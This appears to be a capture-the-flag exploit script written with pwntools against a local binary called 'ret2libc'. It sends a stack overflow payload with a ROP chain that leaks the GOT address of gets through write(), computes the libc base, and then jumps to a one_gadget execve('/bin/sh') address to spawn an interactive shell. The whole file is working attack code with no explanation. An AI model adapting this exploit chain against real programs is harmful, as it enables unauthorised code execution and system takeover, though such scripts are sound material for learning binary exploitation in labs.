from pwn import *
context.log_level = "debug"
p = process("./ret2libc")
e = ELF("./ret2libc")
w_plt = e.plt["write"]
buf2 = e.symbols["buf2"]
vul = e.symbols["vul"]

gets_got = e.got["gets"]
# 0x0000000000400613 : pop rdi ; ret
# 0x0000000000400611 : pop rsi ; pop r15 ; ret
pop_rdi = 0x400613
pp_rsi = 0x400611
#write(1,buf2,size)
payload = "A"*24+p64(pop_rdi)+p64(1)+p64(pp_rsi)+p64(gets_got)+p64(1)+p64(w_plt)+p64(vul)
p.sendlineafter("hello",payload)

gets = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = gets - libc.symbols["gets"]
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one = libc.address + 0xf1147

payload2 = "A"*24+p64(one)
p.sendline(payload2)
p.interactive()


